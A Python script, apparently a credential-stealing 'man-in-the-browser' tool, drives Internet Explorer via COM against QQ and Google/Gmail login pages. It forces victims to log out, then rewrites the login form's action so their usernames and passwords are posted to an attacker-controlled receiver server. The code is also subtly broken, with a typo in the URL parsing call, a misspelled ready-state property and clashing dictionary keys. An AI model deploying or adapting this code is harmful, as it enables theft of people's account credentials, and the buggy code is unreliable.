# -*- coding:utf-8 -*-

import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"

target_sites = {}

target_sites["www.qq.com"] = {
    "logout_url":None,
    "logout_from":"logout_form",
    "login_form_index":0,
    "owned":False
}

target_sites["accounts.google.com"] = {
    "logout_url":"http://",
    "logout_form":None,
    "login_form_index":0,
    "owned":False
}
#gmail的多个域名都用同意的目标配置
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

Windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    #等待浏览器加载一个页面
    while browser.ReadState != 4 and browser.ReadyState != "complete":
        time.sleep(1)
    return

while True:
    for browser in Windows:
        url = urlparse.urlparse(browser,LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            # 如果有一个url ，我们可以重定向
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)

            else:
                #检索文档的所有元素
                full_doc = browser.Document.all
                #迭代，寻找注销的表单
                for i in full_doc:
                    try:
                        #找到退出登录的表单并提交
                        if i.id ==target_sites[url.hostname]["logout_from"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s"%(data_receiver,login_page)
                target_sites[url.hostname]["owned"] = True

            except:
                pass
        time.sleep(5)
